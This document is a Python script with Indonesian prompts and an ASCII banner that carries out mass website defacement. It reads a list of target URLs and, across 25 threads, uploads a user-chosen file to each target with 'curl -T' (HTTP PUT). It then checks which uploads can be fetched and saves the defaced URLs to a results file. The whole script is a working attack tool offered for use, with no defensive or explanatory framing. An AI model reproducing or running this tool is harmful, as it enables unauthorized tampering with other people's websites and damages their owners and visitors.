import os , sys, requests
from threading import Thread
from multiprocessing.pool import ThreadPool
import time
m="\033[1;31m"
ht="\e[32;1m;5m"
gk="\033[5;32m"
gt="\033[1;32m"
g="\033[0;32m"
w="\033[1;37m"
c="\033[1;36m"
y="\033[1;33m"
try:
    os.mkdir('deface')
except:pass
banner ='''

          .   '||       ||                   ____       '||                                   
 ....   .||.   || ..   ...    ....  .. ...   `  ||    .. ||    ....  .... ...                 
'' .||   ||    ||' ||   ||  .|...||  ||  ||     /,  .'  '||  .|...||  '|.  |                  
.|' ||   ||    ||  ||   ||  ||       ||  ||    //   |.   ||  ||        '|.|                   
'|..'|'  '|.' .||. ||. .||.  '|...' .||. ||.  ((    '|..'||.  '|...'    '|                    
                                              ||                                              
                                              |'                                              
                                    '|| '||'  '|'         '||           '||                   
.. .. ..    ....    ....   ....      '|. '|.  .'    ....   || ...     .. ||   ....   .... ... 
 || || ||  '' .||  ||. '  ||. '       ||  ||  |   .|...||  ||'  ||  .'  '||  '' .||   '|.  |  
 || || ||  .|' ||  . '|.. . '|..       ||| |||    ||       ||    |  |.   ||  .|' ||    '|.|   
.|| || ||. '|..'|' |'..|' |'..|'        |   |      '|...'  '|...'   '|..'||. '|..'|'    '|    
                                                                                              
                                                                                              
'''
print(banner)
def target():
    aa =input("Masukan Link Target : ")
    bb =input("Masukan Alamat File : ")
    os.system("curl -T %s %s"%(bb,aa))
    a = aa+'/'+bb
    b = requests.get(a)
    if 'error' in str(b.content) or 'not found' in str(b.content):
        print('Gagal ! (Website Not Vuln)')
        sys.exit()
    else:
        print('Sukses Deface Link : %s'%(a))
        time.sleep(2)
        sys.exit()

cek=[]
def exec(z):
    try:
        os.system("curl -T %s %s 2>/dev/null"%(b,z))
        os.system("clear")
        print('%sloading'%(gk))
    except:
        pass
    try:
        url = z + '/' + b
        aha = requests.get(url)
        zs = aha.content
        if 'error' in str(zs) or 'not found' in str(zs):
            print('')
        else:
            true='good'
            cek.append(true)
            hsl = open('deface/hasil.txt','a')
            hsl.write(url+'\n')
            hsl.close()
    except:
        pass
try:
    a = open("bin/list.txt","r").read().splitlines()
    print("Succes Read File")
    os.system("clear")
except:
    print("Failed Read File")
    print("Check Your file list")
    pass
b = input("Masukan alamat File : ")
z = []
for c in a:
    z.append(c)
t=ThreadPool(25)
t.map(exec,z)
def cek(k):
    try:
        ass = requests.get(k)
        asw = ass.content
        if 'error' in str(asw) or '404 Not Found' in str(asw) or 'Bad Request' in str(asw):
            pass
        else: 
            print("%s"%(y)+k+'%s[200 OK]%s%s %s'%(gk,g,gt,y))
    except:
        pass
uhuy = open('deface/hasil.txt','r').read().splitlines()
x = []
for d in uhuy:
    x.append(d)
f=ThreadPool(25)
f.map(cek, x)
print ("\n"+"%sFile Tersimpan di folder deface/Hasil.txt"%(c))
